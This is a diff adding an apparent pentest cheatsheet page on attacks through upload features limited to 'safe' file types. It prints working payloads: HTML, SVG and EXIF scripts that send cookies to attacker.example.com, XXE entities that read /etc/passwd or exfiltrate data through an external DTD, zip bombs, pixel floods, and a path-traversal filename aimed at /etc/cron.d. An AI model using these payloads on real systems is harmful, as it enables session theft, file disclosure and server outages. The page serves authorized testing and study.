@@ -1,0 +1,248 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Limited uploads · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › File Upload</nav><h1>Limited uploads</h1><p class="cx-lede">Attacks when only specific non-executable file types are accepted - XSS via HTML/SVG/EXIF, XXE via SVG/XML/DOC, and DoS via decompression bombs and pixel floods.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1059.007, T1499</span><span class="cx-tag">D3FEND D3-FA</span><span class="cx-tag">IMPACT FileWrite, ServerSideEval, FileRead</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>When the upload validation is truly tight and only "safe" file types get through, those types still enable attacks. Three categories:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># XSS - via HTML, SVG, or image metadata
+shell.html        → stored XSS when viewed
+shell.svg         → XSS via inline &lt;script&gt; in SVG XML
+exif Comment      → XSS via metadata that gets displayed
+
+# XXE - via SVG (XML-based) or document files
+shell.svg with &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+shell.xml / shell.docx / shell.pdf (all contain XML)
+
+# DoS - via compression formats
+bomb.zip          → decompression bomb (1 KB expands to 4 GB)
+huge.png          → pixel flood (manipulated dimensions claim 4 gigapixels)</code></pre></figure>
+<p>Success indicator: depends on the attack - XSS triggers on view, XXE reads server files, DoS crashes or stalls the server.</p>
+<h2 id="when-this-section-applies">When this section applies</h2>
+<p>You've tried the <a href="../index.html">arbitrary upload</a> and <a href="../extension-whitelist/index.html">bypass paths</a> and the application genuinely only accepts specific file types. The upload is technically working - your <code>.jpg</code> or <code>.pdf</code> or <code>.svg</code> is accepted and stored - but you can't get an executable file in.</p>
+<p>This is the limited-uploads scenario. The good news: even "safe" file types have attack surface.</p>
+<h2 id="xss-via-uploaded-html">XSS via uploaded HTML</h2>
+<p>If the application accepts <code>.html</code> uploads (file storage, document-sharing, file-attach features), an uploaded HTML file becomes a stored XSS:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;script&gt;
+  fetch(&#x27;https://attacker.example.com/steal?c=&#x27; + document.cookie);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre></figure>
+<p>Upload as <code>payload.html</code>. When any user (admin reviewing uploads, support staff handling a ticket) visits <code>https://target.example.com/uploads/payload.html</code>, their browser executes the script in the <em>target's</em> origin - so it has access to the target's cookies, session, and DOM.</p>
+<p>The XSS payload runs in the <em>uploaded file's origin</em>, which is the same origin as the application - making this a full stored XSS, not a sandboxed cross-origin issue.</p>
+<h3 id="when-direct-html-upload-is-allowed">When direct HTML upload is allowed</h3>
+<p>Some applications explicitly allow HTML uploads for legitimate reasons:</p>
+<ul>
+<li>Email-template editors</li>
+<li>HTML-based document storage</li>
+<li>"Pages" features in CMSes</li>
+<li>Wiki / collaborative-editing tools</li>
+</ul>
+<p>All of these are stored-XSS sinks if the uploaded HTML gets served from the application's origin.</p>
+<h3 id="variant-svg-with-embedded-scripts">Variant - SVG with embedded scripts</h3>
+<p>SVG (Scalable Vector Graphics) is XML-based and can contain JavaScript:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;100&quot; height=&quot;100&quot;&gt;
+    &lt;rect width=&quot;100&quot; height=&quot;100&quot; fill=&quot;green&quot;/&gt;
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        fetch(&#x27;https://attacker.example.com/steal?c=&#x27; + document.cookie);
+    &lt;/script&gt;
+&lt;/svg&gt;</code></pre></figure>
+<p>When the SVG is rendered as an image (<code>&lt;img src="payload.svg"&gt;</code>), the embedded script does <strong>not</strong> execute. When the SVG is loaded directly (<code>&lt;a href="payload.svg"&gt;</code> or browser address bar), the script <strong>does</strong> execute - full XSS.</p>
+<p>The bypass for "but the application only shows the SVG via <code>&lt;img&gt;</code>" - visit the SVG directly in the browser address bar. The user (typically an admin or moderator) clicks the link to view the uploaded file, browser navigates to the SVG URL, browser renders the SVG natively with full JavaScript privileges.</p>
+<h3 id="xss-via-image-exif-metadata">XSS via image EXIF metadata</h3>
+<p>When the application displays image metadata (gallery features, "Image Details" pages), the metadata fields become an XSS vector:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Embed XSS payload in the EXIF Comment field
+exiftool -Comment=&#x27;&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;&#x27; image.jpg
+
+# Or with a more practical payload
+exiftool -Comment=&#x27;&quot;&gt;&lt;script&gt;fetch(&quot;https://attacker.example.com/?c=&quot;+document.cookie)&lt;/script&gt;&#x27; image.jpg</code></pre></figure>
+<p>Upload <code>image.jpg</code>. When the app displays the metadata, the payload renders in the page's HTML and the JS executes. Common metadata fields that accept arbitrary text:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">exiftool -Comment=&#x27;...&#x27; image.jpg
+exiftool -Artist=&#x27;...&#x27; image.jpg
+exiftool -ImageDescription=&#x27;...&#x27; image.jpg
+exiftool -Copyright=&#x27;...&#x27; image.jpg
+exiftool -UserComment=&#x27;...&#x27; image.jpg</code></pre></figure>
+<p>If the app <em>doesn't</em> render metadata, you can still fire the payload by setting the uploaded file's <strong>MIME type to <code>text/html</code></strong> (the <code>Content-Type</code> of the multipart part): some apps then serve the stored "image" as an HTML document, so any markup inside it executes regardless of whether metadata is displayed.</p>
+<h3 id="polyglot-images-for-xss">Polyglot images for XSS</h3>
+<p>A specially-crafted file that's simultaneously a valid image and valid HTML/JavaScript can trigger XSS regardless of how it's loaded:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&lt;polyglot file with both image bytes and HTML/JS markup&gt;</code></pre></figure>
+<p>Construction is finicky - the file needs both formats' parsers to accept it. <a href="https://github.com/Polydet/polyglot-database">Polyglot image library</a> has examples. Use case: when the application sanitizes XSS payloads in metadata but doesn't notice them when loaded as actual file content.</p>
+<h2 id="xxe-via-svg">XXE via SVG</h2>
+<p>SVG is XML. Any XML parser that processes the SVG also processes its DTD declarations - making SVG a vehicle for XML External Entity (XXE) attacks:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;100&quot; height=&quot;100&quot;&gt;
+    &lt;text x=&quot;10&quot; y=&quot;50&quot;&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;</code></pre></figure>
+<p>When the application parses this SVG to render or analyze it, the XML parser resolves the <code>&amp;xxe;</code> entity by reading <code>/etc/passwd</code> and substituting its contents. The resulting SVG (with <code>/etc/passwd</code> content rendered as text) is shown to whoever displays the file.</p>
+<h3 id="variants-for-different-file-reads">Variants for different file reads</h3>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!-- Read a local file --&gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+
+&lt;!-- Read web app source via PHP filter --&gt;
+&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;
+
+&lt;!-- HTTP-based SSRF --&gt;
+&lt;!ENTITY xxe SYSTEM &quot;http://internal-host:8080/admin&quot;&gt;
+
+&lt;!-- Read PHP config (which reveals more useful paths) --&gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///etc/php/7.4/apache2/php.ini&quot;&gt;
+
+&lt;!-- RCE when the PHP expect module is loaded (uncommon - but one payload to check) --&gt;
+&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;</code></pre></figure>
+<p>Even with no reflected output, a <code>file://</code> entity can act as a rough <strong>path oracle</strong> - but the signal is application-dependent, not a clean 200/500 split: an existing, readable file whose bytes break XML parsing (an unescaped <code>&amp;</code>/<code>&lt;</code>, or binary content) can still error, and an app that swallows resolution errors can still return 200. Calibrate against one path you know exists-and-is-readable and one you know is missing, confirm they produce different responses, then sweep.</p>
+<h3 id="where-the-xxe-output-appears">Where the XXE output appears</h3>
+<p>The substitution happens at parse time. The output appears wherever the SVG is rendered:</p>
+<ul>
+<li><strong>Inline <code>&lt;img src="upload.svg"&gt;</code></strong> - file contents appear inside the rendered SVG, visible in the page</li>
+<li><strong>Direct SVG view</strong> - entire file rendered, including substituted content</li>
+<li><strong>SVG → PNG conversion</strong> - server-side conversion includes the substituted text in the resulting PNG (sometimes)</li>
+<li><strong>Metadata extraction</strong> - server parses the SVG to extract metadata, substitution happens, returned data includes file contents</li>
+</ul>
+<p>The first case (inline <code>&lt;img&gt;</code>) is the cleanest - submit the upload, visit the page that shows the SVG, read the file contents directly from the rendered output.</p>
+<h3 id="when-the-svg-output-isnt-directly-visible">When the SVG output isn't directly visible</h3>
+<p>Sometimes the application doesn't display the SVG content as text - only renders it as an image. The XXE substitution still happens, but you can't see it.</p>
+<p>Two approaches:</p>
+<ol>
+<li><strong>Out-of-band exfiltration</strong> - make the XXE fetch a URL on your server, encoding the file contents in the URL:</li>
+</ol>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE svg [
+  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+  &lt;!ENTITY % dtd SYSTEM &quot;http://attacker.example.com/exfil.dtd&quot;&gt;
+  %dtd;
+]&gt;
+&lt;svg&gt;&amp;send;&lt;/svg&gt;</code></pre></figure>
+<p>With <code>exfil.dtd</code> on your server containing:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://attacker.example.com/?d=%file;&#x27;&gt;&quot;&gt;
+%all;</code></pre></figure>
+<p>The parser fetches the DTD, resolves the entity reference, makes an HTTP request to your server with the file contents as the query parameter. You read it from your server logs.</p>
+<ol start="2">
+<li><strong>Error-based exfiltration</strong> - trigger an XML parse error that includes the file contents. This is parser-specific and depends on the application's error visibility.</li>
+</ol>
+<p>The XXE attack class is large enough to deserve a dedicated cluster (planned in the Codex backlog). The SVG-via-upload vector is one of several entry points; the techniques transfer to direct XML uploads, document file uploads, and SOAP endpoints.</p>
+<h2 id="xxe-via-other-document-types">XXE via other document types</h2>
+<p>Many document formats are XML internally:</p>
+<ul>
+<li><strong>Office Open XML</strong> (<code>.docx</code>, <code>.xlsx</code>, <code>.pptx</code>) - ZIP archives containing XML</li>
+<li><strong>OpenDocument</strong> (<code>.odt</code>, <code>.ods</code>, <code>.odp</code>) - same pattern</li>
+<li><strong>EPUB</strong> (<code>.epub</code>) - ZIP + XML</li>
+<li><strong>PDF</strong> - embedded XML for metadata and forms</li>
+</ul>
+<p>When the application processes these files (extracting text, generating previews, indexing), XXE is possible. The payload format differs by document type but the principle is the same:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Open a .docx file (it&#x27;s a ZIP)
+unzip document.docx -d extracted/
+
+# Edit one of the XML files inside (word/document.xml typically)
+# Add the XXE declaration to the XML
+
+# Re-zip
+cd extracted &amp;&amp; zip -r ../poisoned.docx . &amp;&amp; cd ..</code></pre></figure>
+<p>Upload <code>poisoned.docx</code>. When the application parses it (to extract text, generate a preview), the XXE fires.</p>
+<h2 id="dos-decompression-bombs">DoS - decompression bombs</h2>
+<p>When the application automatically processes uploaded archives (extracting ZIP/TAR/GZ), an archive with extreme compression ratios crashes the server.</p>
+<h3 id="zip-bomb">ZIP bomb</h3>
+<p>A classic example: 42.zip - 42 KB compressed, expands to 4.5 PB:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Download the original
+curl -O https://www.bamsoftware.com/hacks/zipbomb/42.zip
+
+# Or generate your own
+echo -n &quot;&quot; &gt; zero.dat
+for i in $(seq 1 30); do
+    cp zero.dat new.dat
+    cat zero.dat new.dat new.dat new.dat new.dat new.dat new.dat new.dat &gt; /tmp/zero.dat
+    mv /tmp/zero.dat zero.dat
+done
+# Compress
+zip bomb.zip zero.dat</code></pre></figure>
+<p>Modern ZIP libraries usually detect this - they cap decompression size or detect the recursive structure. Less-defended apps still crash.</p>
+<h3 id="nested-zip-zip-quine">Nested ZIP - "zip quine"</h3>
+<p>A ZIP containing many copies of itself, each containing many copies, etc. Even more devastating against naive extractors:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>outer.zip
+    ├── inner1.zip
+    │       ├── inner2.zip
+    │       │       ├── ... (50 levels deep)
+    │       │       └── final.zip (containing a 1 GB sparse file)</code></pre></figure>
+<p>A reference implementation: <a href="https://github.com/iamtraction/ZOD">zip-bomb</a>.</p>
+<h3 id="targeting-upload-features">Targeting upload features</h3>
+<p>Apps that automatically extract uploaded ZIPs (file-management, deployment tools, plugin uploaders) are the target. The decompression happens server-side; the bomb consumes server resources.</p>
+<h2 id="dos-pixel-flood">DoS - pixel flood</h2>
+<p>For applications that process uploaded images (resize, generate thumbnails, OCR), a manipulated image with absurd claimed dimensions exhausts memory:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Create an image that claims to be 65535 × 65535 pixels
+# but is actually tiny on disk
+python3 -c &quot;
+import struct
+# Construct a PNG with manipulated dimensions
+png_header = b&#x27;\x89PNG\r\n\x1a\n&#x27;
+ihdr_chunk = struct.pack(&#x27;&gt;I&#x27;, 13) + b&#x27;IHDR&#x27; + struct.pack(&#x27;&gt;II&#x27;, 65535, 65535) + b&#x27;\x08\x02\x00\x00\x00&#x27; + b&#x27;\x00\x00\x00\x00&#x27;
+# ... add minimal valid IDAT and IEND chunks
+&quot; &gt; pixel-bomb.png</code></pre></figure>
+<p>When the application tries to decode this for resizing (allocate <code>65535 × 65535 × 4</code> bytes = ~17 GB), it OOMs.</p>
+<p>JPEG and PNG decoders have inconsistent defenses against this. ImageMagick, Pillow, GraphicsMagick all have CVEs related to pixel floods.</p>
+<h2 id="dos-oversized-uploads">DoS - oversized uploads</h2>
+<p>The simplest DoS: upload a very large file. If the application doesn't enforce a size limit:</p>
+<ul>
+<li>Fills the upload disk</li>
+<li>Exhausts upload-temporary-storage</li>
+<li>Consumes bandwidth</li>
+<li>Stresses the upload-processing pipeline</li>
+</ul>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Generate a 10 GB file (sparse, takes no actual disk on attacker side)
+dd if=/dev/zero of=huge.dat bs=1M count=10240
+
+# Or pull data from /dev/random for non-compressible content
+dd if=/dev/urandom of=huge.dat bs=1M count=1024</code></pre></figure>
+<p>Upload. If the server accepts it without size limit, disk fills up.</p>
+<h2 id="dos-directory-traversal-via-filename">DoS - directory traversal via filename</h2>
+<p>When the upload writes to disk using the user-supplied filename without sanitization, path traversal in the name can:</p>
+<ul>
+<li>Overwrite system files</li>
+<li>Crash the server by writing to special paths</li>
+<li>Create files in unexpected locations</li>
+</ul>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">Content-Disposition: form-data; name=&quot;uploadFile&quot;; filename=&quot;../../../etc/cron.d/evil&quot;</code></pre></figure>
+<p>The application's <code>move_uploaded_file($tmpName, $uploadDir . $filename)</code> resolves to <code>/uploads/../../../etc/cron.d/evil</code> → <code>/etc/cron.d/evil</code>. If the web user can write there (rare), the operator just dropped a cron job that runs as root.</p>
+<p>More commonly the operator can write somewhere innocuous but still useful - e.g., <code>../../../var/www/html/shell.php</code> lands the file outside the protected uploads directory.</p>
+<h2 id="combining-limited-upload-primitives">Combining limited-upload primitives</h2>
+<p>The attacks compose:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Upload SVG with XXE → leak source code via php://filter
+                   → identify SQL injection in the source
+                   → exploit SQL injection separately
+                   → exfiltrate database</code></pre></figure>
+<p>Or:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Upload HTML with stored XSS → admin views it
+                            → XSS steals admin session cookie
+                            → operator uses cookie for full admin access
+                            → admin panel allows other uploads / file management → escalation</code></pre></figure>
+<p>Limited-upload bugs are rarely terminal. They're stepping stones to bigger findings.</p>
+<h2 id="detection-only-payloads">Detection-only payloads</h2>
+<p>Probes that confirm the vulnerability without doing anything destructive:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;!-- XSS via SVG - alert is non-destructive --&gt;
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
+    &lt;script&gt;alert(document.domain)&lt;/script&gt;
+&lt;/svg&gt;
+
+&lt;!-- XXE - OOB callback only --&gt;
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE svg [&lt;!ENTITY xxe SYSTEM &quot;http://&lt;COLLAB&gt;/xxe-probe&quot;&gt;]&gt;
+&lt;svg&gt;&amp;xxe;&lt;/svg&gt;</code></pre></figure>
+<p>The XXE OOB callback uses Burp Collaborator (or your own DNS/HTTP server). The probe doesn't read any file or alert anyone - it just confirms the XXE engine is reachable. Then commit to a real read.</p>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong>Limited-upload attacks often look "less severe" but compose into serious findings.</strong> A stored XSS via uploaded HTML is medium-severity alone but leads to admin session theft. An XXE in SVG leads to source disclosure leading to other vulnerabilities. The chain matters more than the individual primitive.</li>
+<li><strong>Image format processors are a CVE goldmine.</strong> ImageMagick, Pillow, libpng, libjpeg have all had memory-corruption CVEs from malformed uploads. When the target is an app that processes user images server-side, version-specific exploits sometimes give RCE through pure image upload.</li>
+<li><strong>Media processing beyond images is exploitable too.</strong> Any automatic server-side processing of an upload - video transcoding, archive extraction, document conversion - carries its own CVE history. The classic example is a crafted <strong>AVI upload that makes <code>ffmpeg</code> disclose arbitrary local files</strong> through its HLS/playlist demuxer (CVE-2017-9993) - often loosely called "XXE" but really the demuxer following attacker-controlled references, not XML entity expansion. Any pipeline that decodes or transcodes what you upload is worth checking against known library CVEs.</li>
+<li><strong>SVG is the most versatile limited-upload primitive.</strong> XML for XXE, script tags for XSS, image rendering for stealth, sometimes server-side rendering for additional attack surface. When SVG uploads are allowed, several attack classes are reachable.</li>
+<li><strong>DoS findings have lower severity in pentest reports</strong> but real impact during incident response. A user discovering that they can take down the application with a 10 KB file is genuinely useful to know.</li>
+</ul>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>Triggering DoS during a pentest is rarely authorized. Verify scope before uploading decompression bombs or pixel floods - these are easy to crash a server with, and the cleanup (restart services, clear disk, restart from snapshot) can take significant time. Document the vulnerability and describe the attack vector; don't execute it unless explicitly scoped.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../content-type-bypass/index.html">Previous: Content-Type bypass</a><a class="cx-next" href="../post-upload/index.html">Next: Post-upload</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
